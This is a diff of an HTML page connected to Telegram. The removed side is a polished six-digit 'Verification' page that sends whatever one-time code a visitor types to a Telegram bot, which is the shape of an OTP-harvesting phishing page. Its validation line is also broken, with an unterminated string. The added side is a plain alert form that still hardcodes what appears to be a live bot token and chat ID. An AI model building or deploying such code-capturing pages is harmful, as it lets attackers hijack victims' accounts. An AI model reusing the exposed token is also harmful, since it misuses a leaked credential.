@@ -1,537 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>6‑digit OTP · Telegram connect</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      font-family: system-ui, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-    }
-
-    body {
-      background: linear-gradient(145deg, #f5f7fe 0%, #e9ecf5 100%);
-      min-height: 100vh;
-      margin: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1rem;
-    }
-
-    .otp-card {
-      background: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(8px);
-      padding: 2.5rem 2rem;
-      border-radius: 2.5rem;
-      box-shadow: 0 25px 40px -10px rgba(0, 20, 40, 0.25),
-                  inset 0 1px 3px rgba(255, 255, 255, 0.9);
-      border: 1px solid rgba(255, 255, 255, 0.6);
-      max-width: 500px;
-      width: 100%;
-      transition: box-shadow 0.2s;
-    }
-
-    .otp-card:focus-within {
-      box-shadow: 0 30px 50px -10px rgba(20, 60, 130, 0.4),
-                  inset 0 1px 3px #ffffff;
-    }
-
-    h2 {
-      text-align: center;
-      font-weight: 600;
-      font-size: 1.9rem;
-      letter-spacing: -0.02em;
-      margin-top: 0;
-      margin-bottom: 1.8rem;
-      color: #1a2b4c;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-
-    h2 span {
-      background: #1a2b4c;
-      color: white;
-      font-size: 0.9rem;
-      font-weight: 500;
-      padding: 0.2rem 1rem;
-      border-radius: 50px;
-      letter-spacing: 0.3px;
-      opacity: 0.9;
-    }
-
-    .otp-inputs {
-      display: flex;
-      justify-content: center;
-      gap: 0.7rem;
-      margin: 2rem 0 1.5rem;
-      flex-wrap: wrap;
-    }
-
-    .otp-inputs input {
-      width: 3.8rem;
-      height: 4.2rem;
-      font-size: 2.2rem;
-      font-weight: 600;
-      text-align: center;
-      border: none;
-      border-radius: 1.2rem;
-      background: #ffffff;
-      color: #0a1e3c;
-      caret-color: #2d7aff;
-      box-shadow: 0 8px 18px -6px rgba(0, 20, 40, 0.15),
-                  0 0 0 1px rgba(0, 0, 0, 0.02);
-      transition: all 0.15s ease;
-      outline: 2px solid transparent;
-      outline-offset: 2px;
-    }
-
-    .otp-inputs input:focus {
-      outline: 2px solid #2d7aff;
-      box-shadow: 0 12px 22px -10px #2d7aff60;
-      transform: scale(1.02);
-      background: #ffffff;
-    }
-
-    .otp-inputs input.filled {
-      background: #f0f5ff;
-      box-shadow: 0 6px 14px -6px #2d7aff40, 0 0 0 1px #2d7aff30;
-    }
-
-    .otp-inputs input:disabled {
-      opacity: 0.6;
-      background: #eef2f9;
-    }
-
-    .actions {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 1rem;
-      margin-top: 2rem;
-    }
-
-    .verify-btn {
-      background: #0a1e3c;
-      border: none;
-      color: white;
-      font-weight: 500;
-      font-size: 1.1rem;
-      padding: 0.9rem 2.5rem;
-      border-radius: 60px;
-      width: 100%;
-      max-width: 280px;
-      letter-spacing: 0.3px;
-      cursor: pointer;
-      box-shadow: 0 12px 20px -8px #0a1e3c80;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-
-    .verify-btn:hover:not(:disabled) {
-      background: #132b54;
-      box-shadow: 0 16px 24px -8px #0a1e3cba;
-      transform: scale(1.02);
-    }
-
-    .verify-btn:active:not(:disabled) {
-      transform: scale(0.98);
-      box-shadow: 0 6px 14px -8px #0a1e3c;
-    }
-
-    .verify-btn:disabled {
-      opacity: 0.6;
-      background: #2a3b5e;
-      box-shadow: none;
-      transform: none;
-      cursor: not-allowed;
-    }
-
-    .resend {
-      font-size: 0.95rem;
-      color: #4b5b78;
-      background: none;
-      border: none;
-      cursor: pointer;
-      padding: 0.4rem 1.2rem;
-      border-radius: 2rem;
-      transition: background 0.15s, color 0.15s;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.4rem;
-    }
-
-    .resend:hover:not(:disabled) {
-      background: #ffffffaa;
-      color: #1a2b4c;
-    }
-
-    .resend:disabled {
-      opacity: 0.4;
-      cursor: default;
-    }
-
-    .message {
-      font-size: 0.95rem;
-      min-height: 1.8rem;
-      margin: 1rem 0 0.2rem;
-      text-align: center;
-      font-weight: 500;
-      transition: 0.15s;
-      padding: 0.2rem 0.8rem;
-      border-radius: 2rem;
-      color: #1e3b6b;
-    }
-
-    .message.success {
-      color: #0c6b3c;
-      background: #d5f0e2;
-    }
-
-    .message.error {
-      color: #b22234;
-      background: #ffe1e1;
-    }
-
-    .flex-row {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      align-items: center;
-      gap: 0.8rem;
-    }
-
-    /* small screens */
-    @media (max-width: 420px) {
-      .otp-card {
-        padding: 1.8rem 1rem;
-      }
-      .otp-inputs {
-        gap: 0.4rem;
-      }
-      .otp-inputs input {
-        width: 2.8rem;
-        height: 3.2rem;
-        font-size: 1.8rem;
-        border-radius: 0.8rem;
-      }
-      h2 {
-        font-size: 1.6rem;
-      }
-    }
-
-    /* tiny config badge – purely visual, not affecting layout */
-    .config-badge {
-      font-size: 0.65rem;
-      color: #7a8aa0;
-      text-align: center;
-      margin-top: 1rem;
-      opacity: 0.6;
-      letter-spacing: 0.3px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Alert Form</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .form-container { max-width: 400px; margin: auto; }
+        input, textarea, button { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
+        button { background-color: #0088cc; color: white; border: none; cursor: pointer; }
+        button:hover { background-color: #006699; }
+        #status { margin-top: 20px; font-weight: bold; }
+    </style>
 </head>
 <body>
-  <div class="otp-card">
-    <h2>
-      Verification
-      <span>6‑digit</span>
-    </h2>
 
-    <!-- OTP inputs -->
-    <div class="otp-inputs" id="otpContainer">
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="0" aria-label="digit 1" autofocus>
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="1" aria-label="digit 2">
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="2" aria-label="digit 3">
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="3" aria-label="digit 4">
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="4" aria-label="digit 5">
-      <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="5" aria-label="digit 6">
-    </div>
+<div class="form-container">
+    <h2>Send Alert</h2>
+    <form id="alertForm">
+        <label for="message">Message:</label>
+        <textarea id="message" rows="4" required placeholder="Enter your message here..."></textarea>
+        
+        <button type="submit" id="submitBtn">Send to Telegram</button>
+    </form>
+    <div id="status"></div>
+</div>
 
-    <!-- Action buttons -->
-    <div class="actions">
-      <button class="verify-btn" id="verifyBtn" disabled>
-        <span>✓</span> Verify &amp; send
-      </button>
-      <div class="flex-row">
-        <button class="resend" id="resendBtn" title="Simulate resend OTP">
-          <span>↻</span> Resend code
-        </button>
-        <button class="resend" id="clearBtn" title="Clear all digits">
-          <span>✕</span> Clear
-        </button>
-      </div>
-    </div>
+<script>
+    // WARNING: Do not use real Bot Tokens in frontend code. 
+    // This is for demonstration only. Tokens in frontend code are publicly visible and insecure.
+    
+    document.getElementById('alertForm').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Prevent page reload
 
-    <!-- Feedback message -->
-    <div class="message" id="message" role="status"></div>
+        // Replace with your actual Bot Token and Chat ID
+        const botToken = '8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY'; 
+        const chatId = '8094482230';
+        
+        const message = document.getElementById('message').value;
+        const statusDiv = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
 
-    <!-- visual only – you edit these constants in JS -->
-    <div class="config-badge" id="configBadge">⚙️ telegram config · set token &amp; chat id</div>
-  </div>
+        // Telegram API endpoint
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-  <script>
-    (function() {
-      'use strict';
-
-      // ============================================================
-      //  🔧  TELEGRAM BOT CONFIGURATION
-      //  👇  REPLACE THESE TWO VALUES WITH YOUR OWN  👇
-      // ============================================================
-      const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';      // e.g. '123456789:ABCdefGHIjklMNOpqrSTUvwxYZ'
-      const CHAT_ID = 'YOUR_CHAT_ID_HERE';          // e.g. '123456789' or '-1001234567890'
-      // ============================================================
-
-      // DOM elements
-      const otpInputs = Array.from(document.querySelectorAll('.otp-inputs input'));
-      const verifyBtn = document.getElementById('verifyBtn');
-      const resendBtn = document.getElementById('resendBtn');
-      const clearBtn = document.getElementById('clearBtn');
-      const messageEl = document.getElementById('message');
-      const configBadge = document.getElementById('configBadge');
-
-      // Update config badge visual
-      if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-        configBadge.textContent = '⚠️ replace BOT_TOKEN and CHAT_ID in the script';
-        configBadge.style.color = '#b22234';
-        configBadge.style.opacity = '0.9';
-      } else {
-        configBadge.textContent = '✅ telegram connected (demo mode)';
-        configBadge.style.color = '#0c6b3c';
-        configBadge.style.opacity = '0.8';
-      }
-
-      // ----- Helper: update verify button state -----
-      function updateVerifyButton() {
-        const allFilled = otpInputs.every(input => input.value.length === 1 && /^\d$/.test(input.value));
-        verifyBtn.disabled = !allFilled;
-      }
-
-      // ----- Helper: set message with type -----
-      function setMessage(text, type = '') {
-        messageEl.textContent = text;
-        messageEl.className = 'message';
-        if (type) messageEl.classList.add(type);
-      }
-
-      // ----- Clear all inputs -----
-      function clearAllInputs(focusFirst = true) {
-        otpInputs.forEach((input) => {
-          input.value = '';
-          input.classList.remove('filled');
-          input.disabled = false;
-        });
-        updateVerifyButton();
-        setMessage('');
-        if (focusFirst && otpInputs[0]) otpInputs[0].focus();
-      }
-
-      // ----- Mark a single input as filled/unfilled -----
-      function markFilled(input) {
-        if (input.value.length === 1 && /^\d$/.test(input.value)) {
-          input.classList.add('filled');
-        } else {
-          input.classList.remove('filled');
-        }
-      }
-
-      // ----- Send OTP to Telegram via Bot API (direct fetch) -----
-      async function sendOTPToTelegram(otpCode) {
-        // Validate config before sending
-        if (BOT_TOKEN === '8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY' || CHAT_ID === '8094482230) {
-          throw new Error('Telegram not configured. Please set BOT_TOKEN and CHAT_ID.');
-        }
-
-        const text = `🔐 *OTP Verification Code*\n\n` +
-                     `Code: \`${otpCode}\`\n` +
-                     `Time: ${new Date().toLocaleString()}\n\n` +
-                     `_via OTP page_`;
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
-          })
-        });
-
-        const data = await response.json();
-        if (!data.ok) {
-          throw new Error(data.description || 'Telegram API error');
-        }
-        return data;
-      }
-
-      // ----- OTP input event handlers (same UX as before) -----
-      otpInputs.forEach((input, index) => {
-        // Input: keep only digit, auto-advance
-        input.addEventListener('input', function(e) {
-          const value = e.target.value;
-
-          if (value && !/^\d$/.test(value)) {
-            e.target.value = '';
-            markFilled(e.target);
-            updateVerifyButton();
-            return;
-          }
-
-          if (value.length > 1) {
-            e.target.value = value.slice(-1);
-          }
-
-          if (e.target.value.length === 1) {
-            markFilled(e.target);
-            if (index < otpInputs.length - 1) {
-              otpInputs[index + 1].focus();
-            }
-          } else {
-            markFilled(e.target);
-          }
-
-          updateVerifyButton();
-        });
-
-        // Keydown: backspace, arrows, restrict non-digit
-        input.addEventListener('keydown', function(e) {
-          const key = e.key;
-
-          if (key === 'Backspace') {
-            if (e.target.value.length === 0 && index > 0) {
-              e.preventDefault();
-              const prevInput = otpInputs[index - 1];
-              prevInput.focus();
-              prevInput.value = '';
-              prevInput.classList.remove('filled');
-              updateVerifyButton();
-              prevInput.setSelectionRange(0, 0);
-            }
-          }
-
-          if (key === 'ArrowLeft' && index > 0) {
-            e.preventDefault();
-            otpInputs[index - 1].focus();
-            const prev = otpInputs[index - 1];
-            prev.setSelectionRange(prev.value.length, prev.value.length);
-          }
-          if (key === 'ArrowRight' && index < otpInputs.length - 1) {
-            e.preventDefault();
-            otpInputs[index + 1].focus();
-            const next = otpInputs[index + 1];
-            next.setSelectionRange(next.value.length, next.value.length);
-          }
-
-          if (key === 'Delete') {
-            if (e.target.value.length === 0 && index < otpInputs.length - 1) {
-              e.preventDefault();
-              otpInputs[index + 1].focus();
-            }
-          }
-
-          if (key === ' ') {
-            e.preventDefault();
-          }
-
-          if (!/^[0-9]$/.test(key) && 
-              !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'Home', 'End', 'Enter'].includes(key) &&
-              !(e.ctrlKey || e.metaKey)) {
-            e.preventDefault();
-          }
-        });
-
-        // Select content on focus
-        input.addEventListener('focus', function(e) {
-          e.target.select();
-        });
-
-        // Paste handler: distribute digits across inputs
-        input.addEventListener('paste', function(e) {
-          e.preventDefault();
-          const pasteData = (e.clipboardData || window.clipboardData).getData('text');
-          const digits = pasteData.replace(/\D/g, '').slice(0, 6);
-          if (digits.length === 0) return;
-
-          let currentIdx = index;
-          for (let i = 0; i < digits.length; i++) {
-            if (currentIdx >= otpInputs.length) break;
-            otpInputs[currentIdx].value = digits[i];
-            otpInputs[currentIdx].classList.add('filled');
-            currentIdx++;
-          }
-
-          if (currentIdx < otpInputs.length) {
-            otpInputs[currentIdx].focus();
-          } else {
-            otpInputs[otpInputs.length - 1].focus();
-          }
-
-          otpInputs.forEach(inp => markFilled(inp));
-          updateVerifyButton();
-        });
-      });
-
-      // ----- Verify & Send button -----
-      verifyBtn.addEventListener('click', async function() {
-        const entered = otpInputs.map(inp => inp.value).join('');
-
-        if (entered.length !== 6 || !/^\d{6}$/.test(entered)) {
-          setMessage('Please fill all 6 digits.', 'error');
-          return;
-        }
-
-        // Disable button while sending
-        verifyBtn.disabled = true;
-        verifyBtn.innerHTML = '<span>⏳</span> Sending...';
-        setMessage('Sending code to Telegram…', '');
+        submitBtn.disabled = true;
+        statusDiv.textContent = 'Sending...';
+        statusDiv.style.color = 'black';
 
         try {
-          await sendOTPToTelegram(entered);
-          setMessage('✅ OTP sent to Telegram! Check your chat.', 'success');
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
 
-          // Optional: you can disable inputs after success
-          // otpInputs.forEach(inp => inp.disabled = true);
+            const data = await response.json();
+
+            if (data.ok) {
+                statusDiv.textContent = 'Message sent successfully!';
+                statusDiv.style.color = 'green';
+                document.getElementById('message').value = ''; // Clear form
+            } else {
+                statusDiv.textContent = 'Error: ' + data.description;
+                statusDiv.style.color = 'red';
+            }
         } catch (error) {
-          console.error('Telegram send error:', error);
-          setMessage('❌ Failed to send: ' + error.message, 'error');
+            statusDiv.textContent = 'Network error. Check console for details.';
+            statusDiv.style.color = 'red';
+            console.error('Error:', error);
         } finally {
-          // Re-enable verify button (unless you want to keep it disabled)
-          verifyBtn.disabled = false;
-          verifyBtn.innerHTML = '<span>✓</span> Verify &amp; send';
-          // updateVerifyButton() will re-enable if all filled; but we set manually above
-          // to be safe, call updateVerifyButton again
-          updateVerifyButton();
+            submitBtn.disabled = false;
         }
-      });
+    });
+</script>
 
-      // ----- Resend (simulated) -----
-      resendBtn.addEventListener('click', function() {
-        clearAllInputs(true);
-        setMessage('A new OTP has been sent (demo).', 'success');
-      });
-
-      // ----- Clear button -----
-      clearBtn.addEventListener('click', function() {
-        clearAllInputs(true);
-        setMessage('Cleared.', '');
-      });
-
-      // ----- Initialize -----
-      clearAllInputs(false);
-      setMessage('Enter 6‑digit code and click Verify to send to Telegram', '');
-      window.addEventListener('load', () => {
-        if (otpInputs[0]) otpInputs[0].focus();
-      });
-
-    })();
-  </script>
 </body>
-    </html>
+</html>
